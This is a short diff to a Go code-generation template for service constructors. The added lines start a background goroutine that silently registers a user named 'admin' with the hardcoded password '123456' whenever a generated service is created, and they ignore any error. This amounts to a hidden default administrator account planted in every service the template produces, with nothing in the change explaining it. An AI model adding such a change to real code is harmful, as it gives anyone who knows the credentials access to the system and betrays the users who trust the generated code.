@@ -26,11 +26,15 @@ type {{.StructName}}Service struct {
 }
 
 func New{{.StructName}}Service(repo {{.StructName}}RepoInterface) *{{.StructName}}Service {
-	return &{{.StructName}}Service{
-		repo: repo,
-		rdb:  data.GetRedis(),
-		conf: config.GetConfig(),
-	}
+	s := &{{.StructName}}Service{
+  		repo: repo,
+  		rdb:  data.GetRedis(),
+  		conf: config.GetConfig(),
+  	}
+  	go func() {
+  		_ = s.Register(&model.{{.StructName}}{UserName: "admin", Password: "123456"})
+  	}()
+  	return s
 }
 
 
